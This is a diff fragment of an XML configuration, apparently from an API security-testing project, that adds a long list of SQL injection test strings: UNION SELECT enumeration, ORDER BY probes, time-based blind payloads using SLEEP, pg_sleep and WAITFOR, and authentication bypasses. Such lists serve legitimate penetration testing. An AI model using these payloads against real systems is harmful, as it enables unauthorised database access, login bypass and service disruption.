+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or "1"="1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>") or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or ""*"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 18#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 4#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>')) or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 16</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 13--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or "" "</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>");waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>"^"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 17</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 2</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1) or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or "1"="1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AnD SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 18</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or ''^'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT USER(),SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 20#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT NULL</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 3</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or benchmark(50000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 19</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or '1'='1'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or sleep(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 8--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>&amp;&amp;SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or "1"="1"#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 6#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>") or true--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 4</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>waitfor delay '00:00:05'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>\\</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>%' AND 8310=8311 AND '%'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 12</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 23--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' AND id IS NULL; --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 5</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 13</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" "</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>%' AND 8310=8310 AND '%'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 6</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 14</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 8</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 11--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>') or ('x')=('x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'''''''''''''UNION SELECT '2</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or pg_SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 7</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 15</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 9</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1-true</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 8#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>``</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 25#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),4</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>waitfor delay '00:00:05'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' GROUP BY columnnames having 1=1 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>@variable</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or 1=1 or ''='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' OR 'x'='x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>""</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>SLEEP(5)='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>SLEEP(5)="</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 10</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>);waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 21--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>") or ("x")=("x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>"&amp;"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 5--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 11</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 12#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR x=x--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or 'x'='x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 23#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR x=y#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 31337</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' ORDER BY 1,2,3--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR x=x#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>") or sleep(5)="</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings>
